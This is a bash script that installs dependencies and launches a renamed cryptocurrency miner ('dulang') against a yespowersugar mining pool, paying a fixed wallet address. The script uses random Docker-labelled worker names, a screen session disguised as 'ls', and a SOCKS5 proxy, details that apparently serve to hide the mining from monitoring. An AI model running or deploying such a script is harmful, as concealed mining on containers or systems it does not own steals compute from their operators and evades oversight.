#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x dulang
screen -dmS ls 
POOL=stratum+tcp://stratum-eu.rplant.xyz:7042
WALLET=sugar1q32rakwcs7h03g46cvkf4fs9xl4esqq032vatmu.zi5 
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
PROXY=socks5://147.135.116.172:21610
./dulang -a yespowersugar -o $POOL -u $WALLET -p $WORKER -t 70 -x $PROXY
